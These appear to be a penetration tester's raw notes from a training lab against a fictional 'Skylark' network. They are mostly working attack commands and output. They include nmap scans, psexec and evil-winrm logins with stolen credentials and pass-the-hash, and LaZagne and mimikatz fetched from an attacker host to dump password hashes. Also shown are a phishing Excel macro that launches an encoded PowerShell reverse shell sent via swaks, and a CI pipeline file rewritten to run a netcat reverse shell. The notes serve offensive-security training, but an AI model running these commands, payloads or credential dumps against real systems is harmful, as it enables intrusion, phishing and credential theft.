|     <!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>File Browser</title><link rel="icon" type="image/png" sizes="32x32" href="/static/img/icons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/static/img/icons/favicon-16x16.png"><link rel="manifest" id="manifestPlaceholder" crossorigin="use-credentials"><meta name="theme-color" content="#2979ff"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="apple-mobile-web-app-title" content="assets"><link rel="appl
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Cache-Control: no-cache, no-store, must-revalidate
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Fri, 17 May 2024 04:33:15 GMT
|     Content-Length: 14
|     Found
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
|_http-favicon: Unknown favicon MD5: 6129C848CD0F7E7D3699ABE727B26B4A

139/tcp  open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp  open  netbios-ssn syn-ack Samba smbd 4.6.2
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -2s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 44815/tcp): CLEAN (Timeout)
|   Check 2 (port 57141/tcp): CLEAN (Timeout)
|   Check 3 (port 36010/udp): CLEAN (Timeout)
|   Check 4 (port 12796/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-05-17T04:37:40
|_  start_date: N/A
| nbstat: NetBIOS name: ARCHIVE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ARCHIVE<00>          Flags: <unique><active>
|   ARCHIVE<03>          Flags: <unique><active>
|   ARCHIVE<20>          Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   SKYLARK<00>          Flags: <group><active>
|   SKYLARK<1d>          Flags: <unique><active>
|   SKYLARK<1e>          Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nmap -sU -O 10.10.190.12

137/udp open  netbios-ns
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: game console
Running: Nintendo embedded
OS CPE: cpe:/h:nintendo:wii
OS details: Nintendo Wii game console


-----------------------------------------------------------------------------------------
		10.10.190.13	Challenge 3 - VM 4 OS âœ…

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.10.190.13

25/tcp    open  smtp          syn-ack hMailServer smtpd
| smtp-commands: mail.skylark.com, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
110/tcp   open  pop3          syn-ack hMailServer pop3d
|_pop3-capabilities: USER UIDL TOP
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
143/tcp   open  imap          syn-ack hMailServer imapd
|_imap-capabilities: NAMESPACE completed IMAP4rev1 SORT CAPABILITY QUOTA ACL IDLE OK RIGHTS=texkA0001 IMAP4 CHILDREN
445/tcp   open  microsoft-ds? syn-ack
587/tcp   open  smtp          syn-ack hMailServer smtpd
| smtp-commands: mail.skylark.com, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: mail.skylark.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| nbstat: NetBIOS name: MAIL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:5d:4d (VMware)
| Names:
|   MAIL<00>             Flags: <unique><active>
|   MAIL<20>             Flags: <unique><active>
|   SKYLARK<00>          Flags: <group><active>
| Statistics:
|   00:50:56:ab:5d:4d:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 53323/tcp): CLEAN (Timeout)
|   Check 2 (port 53506/tcp): CLEAN (Timeout)
|   Check 3 (port 63328/udp): CLEAN (Timeout)
|   Check 4 (port 17573/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: -2s
| smb2-time: 
|   date: 2024-05-17T04:39:09
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required


â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nmap -sU -O 10.10.190.13

137/udp open  netbios-ns
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: game console
Running: Nintendo embedded
OS CPE: cpe:/h:nintendo:wii
OS details: Nintendo Wii game console


				13: Mail - Pwn3d!
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ impacket-psexec backup_service:It4Server@10.10.209.13 cmd.exe

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
mail

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 646F-F603

 Directory of C:\Users\Administrator\Desktop

05/17/2024  12:17 AM    <DIR>          .
01/10/2023  04:18 AM    <DIR>          ..
05/17/2024  12:17 AM                34 proof.txt
               1 File(s)             34 bytes
               2 Dir(s)  12,298,657,792 bytes free

C:\Users\Administrator\Desktop> type proof.txt
827469e1e79fc108901f5fdeea36c05e



				# CREDS: 
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ evil-winrm -i 10.10.168.13 -u backup_service -p It4Server 

# LaZagne: 
iwr -uri http://192.168.45.192:80/LaZagne.exe -Outfile laz.exe
.\laz.exe all

*Evil-WinRM* PS C:\Users\Public\Downloads> .\laz.exe all
[+] System masterkey decrypted for 282217e9-3355-4862-aec3-6722fd8f1aab
[+] System masterkey decrypted for 3e8e0967-e70e-4ec1-9662-d6855fed2838
[+] System masterkey decrypted for 47ee8a30-1644-4573-a108-d47e36aa486c
[+] System masterkey decrypted for 7752280a-965b-4b75-b01f-95f00334d4a2
########## User: SYSTEM #########
------------------- Hashdump passwords -----------------
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cdb524fa6bba5c3e079c540b1f5174f1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:43bd82e2a61bcc3e3d89c0fc26df6d10:::
------------------- Pypykatz passwords -----------------
[+] Shahash found !!!
Shahash: 29b79f24ccd58a0090b05cfee0b532a53132972f
Nthash: 13b95164b67c1ca29da8ce61c250b158
Login: MAIL$
------------------- Lsa_secrets passwords -----------------
$MACHINE.ACC
0000   F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   81 9F A4 1C 41 2B D2 00 1E 29 91 04 FD 1C FD C1    ....A+...)......
0020   2F DD 86 37 47 79 38 C9 89 26 62 C7 99 E7 59 5B    /..7Gy8..&b...Y[
0030   9E 30 2E DE A9 2E 0D 56 BC 5B F2 85 BD F5 86 2F    .0.....V.[...../
0040   8C EF 6F D7 9A 20 A8 1F 39 1C 30 F4 4D B9 F3 4A    ..o.. ..9.0.M..J
0050   A5 31 58 47 E1 16 2C F6 65 9F 47 B2 99 BD 1C 06    .1XG..,.e.G.....
0060   C5 C2 02 B9 19 72 F4 36 D7 67 E5 F2 18 A3 32 3F    .....r.6.g....2?
0070   DE 81 FC 31 7A 55 6D 05 51 C8 D7 05 39 AA C0 2B    ...1zUm.Q...9..+
0080   20 77 93 1D DE 71 BF EF 1B 39 CB B5 31 AF 6D 3C     w...q...9..1.m<
0090   12 09 0C CB 84 07 68 A9 E7 F3 39 89 C7 5D 29 0A    ......h...9..]).
00A0   63 3D F8 A9 ED F7 14 63 77 00 A3 A0 2F B3 BD 8B    c=.....cw.../...
00B0   12 B4 CA BF 5D CA AD 1F 22 28 36 CA 66 E5 F1 35    ....]..."(6.f..5
00C0   C8 03 A6 EF 2C E2 86 1A F9 D7 94 D5 E6 48 68 E2    ....,........Hh.
00D0   39 EB 81 2A 78 54 5A 81 45 52 71 F5 EA 09 E1 1E    9..*xTZ.ERq.....
00E0   88 A5 AA 27 38 98 47 7E F1 81 AF F5 97 54 CB 70    ...'8.G~.....T.p
00F0   00 D0 3A 93 87 1E 2F 8A 6D 9F B6 BA 21 11 68 F4    ..:.../.m...!.h.
0100   87 30 63 87 A0 0A 73 13 CA D5 B5 DF 47 1F 3B FC    .0c...s.....G.;.
DefaultPassword
0000   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   D6 08 2F DC E0 46 29 64 01 94 79 25 A5 29 42 DF    ../..F)d..y%.)B.
DPAPI_SYSTEM
0000   01 00 00 00 2D 86 D3 64 A4 DD 24 B6 95 EC 0E 6C    ....-..d..$....l
0010   A8 74 89 51 1D F4 A8 15 0D B0 D6 89 9D 9C 43 91    .t.Q..........C.
0020   AB 48 E8 F0 D5 30 E5 F8 0B FA AB 76                .H...0.....v
NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   27 CD 70 CF 2B 21 A7 FA 16 3E 23 D4 72 68 9D F7    '.p.+!...>#.rh..
0020   F7 B1 B7 18 1B 47 BE 01 A8 5D 85 AF FD 7D F0 A3    .....G...]...}..
0030   75 16 AA 3E E4 41 4D 15 F5 E8 4A 73 75 D2 4B 58    u..>.AM...Jsu.KX
0040   2D 27 34 1F 47 20 95 AD 55 81 41 62 F1 09 27 74    -'4.G ..U.Ab..'t
0050   9A 3B F4 EF 29 2D 54 2B 5D 41 BF C9 34 1E 5A 07    .;..)-T+]A..4.Z.
[+] 1 passwords have been found.

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ evil-winrm -i 10.10.168.13 -u Administrator -H cdb524fa6bba5c3e079c540b1f5174f1 

*Evil-WinRM* PS C:\Users\Public\Downloads> (Get-PSReadlineOption).HistorySavePath
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt

*Evil-WinRM* PS C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt

				$ MIMIKATZ
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cdb524fa6bba5c3e079c540b1f5174f1:::

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ impacket-psexec -hashes 00000000000000000000000000000000:cdb524fa6bba5c3e079c540b1f5174f1 Administrator@10.10.168.13

iwr -uri http://192.168.45.192:80/mimikatz.exe -Outfile mimi.exe
.\mimi.exe
privilege::debug
sekurlsa::logonpasswords


				# FILES OF INTEREST
*Evil-WinRM* PS C:\> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
*Evil-WinRM* PS C:\> Get-ChildItem -Path C:\ -Include *.git -File -Recurse -ErrorAction SilentlyContinue -Force
*Evil-WinRM* PS C:\> Get-ChildItem -Path C:\ -Include *.zip -File -Recurse -ErrorAction SilentlyContinue -Force


				# NETWORK:
C:\Windows\system32> ipconfig
Windows IP Configuration
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.168.13
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.168.254
Ethernet adapter Ethernet1:
   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.20.168.254
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

C:\Windows\system32> ipconfig /all 
Windows IP Configuration
   Host Name . . . . . . . . . . . . : mail
   Primary Dns Suffix  . . . . . . . : SKYLARK.com
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : Yes
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : SKYLARK.com
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-AB-E1-21
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.168.13(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.168.254
   DNS Servers . . . . . . . . . . . : 10.10.168.250
   NetBIOS over Tcpip. . . . . . . . : Enabled
Ethernet adapter Ethernet1:
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
   Physical Address. . . . . . . . . : 00-50-56-AB-F9-77
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.20.168.254(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 
   NetBIOS over Tcpip. . . . . . . . : Enabled

C:\Windows\system32> arp -A
0-fc     static    
  239.255.255.250       01-00-5e-7f-ff-fa     static  

C:\Windows\system32> route print
IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  1    331 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None



Looking on the  host .12 I found a file with f.miller@skylark.com e-mail that mentions a Excel document to review 
Wasnâ€™t there a web GUI on 12 that displayed something like 3 files?



				# PHISHING
yeah, in order to get logged into mail server, you need to use the admin hash found in DC instead of the mentioned plain credential:
55375d3c25c50db8a6064014f092646d
         * Username : Administrator
         * Domain   : SKYLARK.com
         * Password : E2koUInnHx5_nrAjBouE

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ impacket-psexec -hashes 00000000000000000000000000000000:55375d3c25c50db8a6064014f092646d SKYLARK/Administrator@10.10.168.13


WINPREP OS Credentials:
xfreerdp /u:offsec /p:lab /v:192.168.208.250 /size:80% /drive:kali,.


ok so I got the excel document working on the test machine, and it downloads powercat and spawns a reverse shell no problem, but when I deliver the payload to the target user account I do not see any activity from the target endpoint.
I tried both xls and xlsm payloads without success.


Log in on WINPREP and start excel and create the macro 
It is not installed you can find Office under C:\Tools
just save it as "Book1" in this case, using Excel 97-2003 Workbook.
Book1.xls
Set up a listener in metasploit, then try again

I used the thunderbird client and was able to get the payload to detonate
The macro works fine on the prep machine, and it worked fine through thunderbird, so I'm assuming there was an issue with the swaks command. I waited several minutes for the payload to detonate without any results.


create your payload like this 
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.xx.xxx lport=443 -f psh-cmd
start a listener with msf meterpreter etc. Use port number 443.
First revert the machine and try these steps again.


â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ swaks -t f.miller@skylark.com --from s.ahmed@skylark.com --attach Book1.xls --server 10.10.168.13 --body body.txt --header "This is awesome" --suppress-data -ap
Username: s.ahmed
Password: WelcomeToSkyl4rk!


sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 10.20.168.15 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap


stun_server_username= l.nguyen
passwd= ChangeMePlease__XMPPTest
reg_identity=sip: l.nguyen@skylark.com
reg_proxy=<sip:172.16.50.32;transport=tls>

stun_server_username= j.jones
passwd= ChangeMePlease__XMPPTest
reg_identity=sip: j.jones@skylark.com
reg_proxy=<sip:172.16.50.32;transport=tls>

stun_server_username=j.jameson
passwd= ChangeMePlease__XMPPTest
reg_identity=sip: j.jameson@skylark.com
reg_proxy=<sip:172.16.50.32;transport=tls>

Hitoshi:xsYu9XPYNu9dBfHo8L4k
Hitoshi@skylark.com:ganbatteyo!123

---------------------------------------

make sure to split your PS:
str= "powershell.exe -nop -w hidden -e aQBmACgAW...SNIP...BTAHQAYQByAHQAKAAkAHMAKQA7AA=="
 
n= 50
for i in range(0, len(str), n):
        print("Str = Str + " + '"' + str[i:i+n] + '"')


Macro should look like:
Sub Auto_Open()
Â Â Â Â MyMacro
End Sub
Â 
Sub Workbook_Open()
Â Â Â Â MyMacro
End Sub
Â 
Sub MyMacro()
Â 
Â Â Â Â Dim Str As String
Â Â Â Â Â 
Â Â Â Â Str =Â "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
Â Â Â Â Str = Str +Â "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
     .....
Â Â Â Â Str = Str +Â "A=="
Â 
Â Â Â Â CreateObject("Wscript.Shell").Run Str
End Sub

Lastly, make sure to use proxychains for swaks:

sudo proxychains swaks -t f.miller@skylark.com --from s.ahmed@skylark.com --attach Book1.xls --server 10.10.XXX.13 --body body.txt --header "This is awesome" --suppress-data -ap



-----------------------------------------------------------------------------------------
		10.20.190.14	Challenge 3 - VM 5 OS

nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.20.190.14

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nmap -sU -O 10.20.190.14

All 1000 scanned ports on 10.20.190.14 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: D-Link DFL-700 firewall (89%), HP Officejet Pro 8500 printer (89%), ReactOS 0.3.7 (89%), Sanyo PLC-XU88 digital video projector (89%), Sonus GSX9000 VoIP proxy (88%), Asus WL-500gP wireless broadband router (88%), Microsoft Windows 2000 (88%), Microsoft Windows Server 2003 Enterprise Edition SP2 (88%), Microsoft Windows Server 2003 SP2 (88%), Novell NetWare 6.5 (88%)
No exact OS matches for host (test conditions non-ideal).


		SHELL AS: gitlab-runner - 10.20.143.14
https://www.revshells.com/
http://cicd.skylark.com/skylark-rd/scratchpad
http://cicd.skylark.com/skylark-rd/scratchpad/-/blob/main/.gitlab-ci.yml

# TODO: Make sure we run tests as part of the CICD!

before_script:
  - python3 --version  # For debugging

test:
  script:
    - busybox nc 192.168.45.215 2560 -e sh

run:
  script:
    - busybox nc 192.168.45.215 2560 -e sh


python3 -c 'import pty; pty.spawn("/bin/bash")'
gitlab-runner@cicd:~/builds/uYcz25_z/0/skylark-rd/scratchpad$ 

gitlab-runner@cicd:~/builds/uYcz25_z/0/skylark-rd/scratchpad$ whoami
gitlab-runner

gitlab-runner@cicd:~/builds/uYcz25_z/0/skylark-rd/scratchpad$ id
uid=993(gitlab-runner) gid=993(gitlab-runner) groups=993(gitlab-runner)

gitlab-runner@cicd:~/builds/uYcz25_z/0/skylark-rd/scratchpad$ hostname
cicd

itlab-runner@cicd:~$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:ab:80:dc brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    inet 10.20.143.14/24 brd 10.20.143.255 scope global noprefixroute ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feab:80dc/64 scope link 
       valid_lft forever preferred_lft forever


gitlab-runner@cicd:~$ cat local.txt
eedda4137d5e53a8198e19cd9fe67aab

gitlab-runner@cicd:/$ cd root
bash: cd: root: Permission denied


-----------------------------------------------------------------------------------------
		10.20.190.15	Challenge 3 - VM 6 OS

nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.20.190.15

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nmap -sU -O 10.20.190.15

All 1000 scanned ports on 10.20.190.15 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: D-Link DFL-700 firewall (89%), HP Officejet Pro 8500 printer (89%), ReactOS 0.3.7 (89%), Sanyo PLC-XU88 digital video projector (89%), Sonus GSX9000 VoIP proxy (88%), Asus WL-500gP wireless broadband router (88%), Microsoft Windows 2000 (88%), Microsoft Windows Server 2003 Enterprise Edition SP2 (88%), Microsoft Windows Server 2003 SP2 (88%), Novell NetWare 6.5 (88%)
No exact OS matches for host (test conditions non-ideal).

impacket-psexec backup_service:It4Server@10.20.168.15 cmd.exe


-----------------------------------------------------------------------------------------
		10.20.190.110	Challenge 3 - VM 7 OS

nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.20.190.110

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nmap -sU -O 10.20.190.110

All 1000 scanned ports on 10.20.190.110 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: D-Link DFL-700 firewall (89%), HP Officejet Pro 8500 printer (89%), ReactOS 0.3.7 (89%), Sanyo PLC-XU88 digital video projector (89%), Sonus GSX9000 VoIP proxy (88%), Asus WL-500gP wireless broadband router (88%), Microsoft Windows 2000 (88%), Microsoft Windows Server 2003 Enterprise Edition SP2 (88%), Microsoft Windows Server 2003 SP2 (88%), Novell NetWare 6.5 (88%)
No exact OS matches for host (test conditions non-ideal).

impacket-psexec backup_service:It4Server@10.20.168.110 cmd.exe


-----------------------------------------------------------------------------------------
		10.20.190.111	Challenge 3 - VM 8 OS

nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.20.168.111

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nmap -sU -O 10.20.190.111

All 1000 scanned ports on 10.20.190.111 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: D-Link DFL-700 firewall (89%), HP Officejet Pro 8500 printer (89%), ReactOS 0.3.7 (89%), Sanyo PLC-XU88 digital video projector (89%), Sonus GSX9000 VoIP proxy (88%), Asus WL-500gP wireless broadband router (88%), Microsoft Windows 2000 (88%), Microsoft Windows Server 2003 Enterprise Edition SP2 (88%), Microsoft Windows Server 2003 SP2 (88%), Novell NetWare 6.5 (88%)
No exact OS matches for host (test conditions non-ideal).


impacket-psexec backup_service:It4Server@10.20.168.111 cmd.exe

-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
		172.16.154.30	Challenge 3 - VM 9 OS

nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 172.16.154.30

sudo nmap -sU -O 172.16.154.30


stun_server_username= l.nguyen
passwd= ChangeMePlease__XMPPTest
reg_identity=sip: l.nguyen@skylark.com
reg_proxy=<sip:172.16.50.32;transport=tls>

stun_server_username= j.jones
passwd= ChangeMePlease__XMPPTest
reg_identity=sip: j.jones@skylark.com
reg_proxy=<sip:172.16.50.32;transport=tls>

stun_server_username=j.jameson
passwd= ChangeMePlease__XMPPTest
reg_identity=sip: j.jameson@skylark.com
reg_proxy=<sip:172.16.50.32;transport=tls>

-----------------------------------------------------------------------------------------
		172.16.154.31	Challenge 3 - VM 10 OS

nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 172.16.154.31

sudo nmap -sU -O 172.16.154.31

-----------------------------------------------------------------------------------------
		172.16.154.32	Challenge 3 - VM 19 OS

nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 172.16.154.32

sudo nmap -sU -O 172.16.154.32

-----------------------------------------------------------------------------------------
				EXTERNAL IPS:
-----------------------------------------------------------------------------------------
		192.168.154.220	Challenge 3 - VM 11 OS âœ…

HTTP: 80 5985 47001
VNC: 5900
RPC: 135
SMB: 139 445
???: 1500 2362 3841 6864 7628 12511 13456 14742 18714 21188 25376 27035 27830 33866 36640 39017 40884 43178 46422 55414 58391 65005

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.154.220

HTTP: 80 5985 47001
80/tcp    open     http            syn-ack     Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: 9200225B96881264E6481C77D69C622C
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Home page - Skylark Partner Portal
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=SKYLARK
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
5985/tcp  open     http            syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open     http            syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

VNC: 5900
5900/tcp  open     vnc             syn-ack     VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     Ultra (17)
|     Unknown security type (116)
|_    VNC Authentication (2)

RPC: 135
135/tcp   open     msrpc           syn-ack     Microsoft Windows RPC
49664/tcp open     msrpc           syn-ack     Microsoft Windows RPC
49665/tcp open     msrpc           syn-ack     Microsoft Windows RPC
49666/tcp open     msrpc           syn-ack     Microsoft Windows RPC
49667/tcp open     msrpc           syn-ack     Microsoft Windows RPC
49668/tcp open     msrpc           syn-ack     Microsoft Windows RPC
49669/tcp open     msrpc           syn-ack     Microsoft Windows RPC
49670/tcp open     msrpc           syn-ack     Microsoft Windows RPC
49672/tcp open     msrpc           syn-ack     Microsoft Windows RPC

SMB: 139 445
139/tcp   open     netbios-ssn     syn-ack     Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds?   syn-ack
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 56604/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 44495/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 39473/udp): CLEAN (Timeout)
|   Check 4 (port 36754/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-05-14T02:41:58
|_  start_date: N/A
|_clock-skew: -3s

???: 1500 2362 3841 6864 7628 12511 13456 14742 18714 21188 25376 27035 27830 33866 36640 39017 40884 43178 46422 55414 58391 65005
1500/tcp  filtered vlsi-lm         no-response
2362/tcp  filtered digiman         no-response
3841/tcp  filtered zfirm-shiprush3 no-response
6864/tcp  filtered unknown         no-response
7628/tcp  filtered zen-pawn        no-response
12511/tcp filtered unknown         no-response
13456/tcp filtered unknown         no-response
14742/tcp filtered unknown         no-response
18714/tcp filtered unknown         no-response
21188/tcp filtered unknown         no-response
25376/tcp filtered unknown         no-response
27035/tcp filtered unknown         no-response
27830/tcp filtered unknown         no-response
33866/tcp filtered unknown         no-response
36640/tcp filtered unknown         no-response
39017/tcp filtered unknown         no-response
40884/tcp filtered unknown         no-response
43178/tcp filtered unknown         no-response
46422/tcp filtered unknown         no-response
55414/tcp filtered unknown         no-response
58391/tcp filtered unknown         no-response
65005/tcp filtered unknown         no-response

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nmap -sU -O 192.168.154.220
123/udp  open|filtered ntp
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
500/udp  open|filtered isakmp
4500/udp open|filtered nat-t-ike
5353/udp open|filtered zeroconf
5355/udp open|filtered llmnr
Running: Microsoft Windows 2008, Novell NetWare 6.X


			HTTP: 80 5985 47001
http://192.168.154.220/
Usersanme: 
Password: 

feroxbuster -u http://192.168.154.220/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 

